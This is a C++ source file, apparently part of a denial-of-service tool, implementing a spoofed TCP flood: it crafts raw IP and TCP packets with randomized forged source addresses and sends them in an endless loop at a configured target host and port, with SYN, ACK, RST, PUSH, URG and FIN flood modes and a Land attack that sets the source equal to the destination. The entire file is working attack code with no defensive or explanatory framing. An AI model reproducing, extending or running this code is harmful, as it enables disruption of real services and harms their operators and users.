#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>

#include "../Headers/Randomizer.hpp"
#include "../Headers/Spoofed_TCP_Flood.hpp"

void Spoofed_TCP_Flood::attack(const int *id) {
    int r;
    std::vector<int> sockets;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
    }
    std::string message{};
    char buf[8192], *pseudogram;
    struct pseudo_header psh{};
    auto *ip = (struct iphdr *) buf;
    auto *tcp = (struct tcphdr *) (buf + sizeof (struct ip));
    struct hostent *hp;
    struct sockaddr_in dst{};
    while (true){
        for(int x = 0; x < conf->CONNECTIONS; x++){
            bzero(buf, sizeof(buf));
            if(!sockets[x]){
                sockets[x] = make_socket(IPPROTO_TCP);
            }

            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
                    logger->Log("Can't resolve the host", Logger::Error);
                    exit(EXIT_FAILURE);
                }
            }else{
                bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
            }
            if(conf->RandomizeSource){
                if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
                    continue;
                }
            }else{
                ip->saddr = 0;
            }

            init_headers(ip, tcp, buf);
            override_headers(tcp, ip);

            dst.sin_addr.s_addr = ip->daddr;
            dst.sin_family = AF_UNSPEC;

            psh.source_address = ip->saddr;
            psh.dest_address = ip->daddr;
            psh.placeholder = 0;
            psh.protocol = IPPROTO_TCP;
            psh.length = htons(sizeof(struct tcphdr) + strlen(buf));

            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(buf);
            pseudogram = static_cast<char *>(malloc(static_cast<size_t>(psize)));

            memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
            memcpy(pseudogram + sizeof(struct pseudo_header) , tcp , sizeof(struct tcphdr) + strlen(buf));

            tcp->check = csum( (unsigned short*) pseudogram , psize);


            if((r = static_cast<int>(sendto(sockets[x], buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)))) == -1){
                close(sockets[x]);
                sockets[x] = make_socket(IPPROTO_TCP);
            }else{
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        pause();
    }
}

Spoofed_TCP_Flood::Spoofed_TCP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {

}

void Spoofed_TCP_Flood::override_headers(tcphdr *tcp, iphdr *ip){
    switch (conf->vector){
        case config::SpoofedSyn:
            tcp->th_flags = TH_SYN;
            break;
        case config::SpoofedAck:
            tcp->th_flags = TH_ACK;
            break;
        case config::SpoofedRST:
            tcp->th_flags = TH_RST;
            break;
        case config::SpoofedPUSH:
            tcp->th_flags = TH_PUSH;
            break;
        case config::SpoofedURG:
            tcp->th_flags = TH_URG;
            break;
        case config::SpoofedFin:
            tcp->th_flags = TH_FIN;
            break;
        case config::Land:
            tcp->th_flags = TH_SYN;
            ip->saddr = ip->daddr;
            tcp->source = tcp->dest;
        default:break;
    }
}

void Spoofed_TCP_Flood::init_headers(iphdr *ip, tcphdr *tcp, char *buf) {
    auto s_port = Randomizer::randomPort();
    // IP Struct
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 16;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(buf);
    ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
    ip->frag_off = htons(0x0);
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;

    ip->check = csum((unsigned short *) buf, ip->tot_len);

    // TCP Struct
    tcp->source = htons(static_cast<uint16_t>(s_port));
    tcp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
    tcp->seq = 0;
    tcp->doff = 5;  //tcp header size
    tcp->window = htons (5840);
    tcp->check = 0;
    tcp->th_flags = 0;
}
